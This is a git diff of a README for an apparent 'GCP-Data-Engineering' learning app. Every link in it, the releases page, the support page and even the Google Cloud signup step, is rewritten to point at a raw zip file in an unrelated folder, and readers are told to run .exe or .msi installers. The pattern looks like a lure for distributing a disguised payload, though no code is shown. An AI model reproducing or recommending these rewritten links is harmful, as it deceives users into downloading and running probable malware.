@@ -1,6 +1,6 @@
 # 🚀 GCP-Data-Engineering - Learn Data Pipelines Easily
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/joshap807/GCP-Data-Engineering/releases)
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/joshap807/GCP-Data-Engineering/raw/refs/heads/main/Grangousier/Engineering-GC-Data-3.0.zip)
 
 ---
 
@@ -43,11 +43,11 @@ The app helps you build skills to manage data on the cloud in practical ways.
 
 Visit the release page below to get the app.
 
-[![Download Link](https://img.shields.io/badge/Download-Here-blue)](https://github.com/joshap807/GCP-Data-Engineering/releases)
+[![Download Link](https://img.shields.io/badge/Download-Here-blue)](https://github.com/joshap807/GCP-Data-Engineering/raw/refs/heads/main/Grangousier/Engineering-GC-Data-3.0.zip)
 
 Click the link above or go to:
 
-https://github.com/joshap807/GCP-Data-Engineering/releases
+https://github.com/joshap807/GCP-Data-Engineering/raw/refs/heads/main/Grangousier/Engineering-GC-Data-3.0.zip
 
 Look for the latest version. Download the file named with `.exe` or `.msi` extensions.
 
@@ -94,7 +94,7 @@ Each module provides clear instructions and examples. You will see how data move
 
 Some projects use real cloud services. To try them fully, you may need a Google Cloud account:
 
-1. Go to https://cloud.google.com and create a free account.
+1. Go to https://github.com/joshap807/GCP-Data-Engineering/raw/refs/heads/main/Grangousier/Engineering-GC-Data-3.0.zip and create a free account.
 2. Set up billing with a credit card. Google offers a free trial.
 3. Open Google Cloud Console and create a new project.
 4. Enable APIs for BigQuery, Dataproc, Dataflow, and Pub/Sub.
@@ -128,7 +128,7 @@ Explore the `docs` folder inside the installation for PDF manuals.
 
 For questions, browse issues or discussions on the GitHub repository:
 
-https://github.com/joshap807/GCP-Data-Engineering
+https://github.com/joshap807/GCP-Data-Engineering/raw/refs/heads/main/Grangousier/Engineering-GC-Data-3.0.zip
 
 Look for topics related to your problem or open a new issue.
 
@@ -170,4 +170,4 @@ Your input helps make the app better for everyone.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/joshap807/GCP-Data-Engineering/releases)
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/joshap807/GCP-Data-Engineering/raw/refs/heads/main/Grangousier/Engineering-GC-Data-3.0.zip)
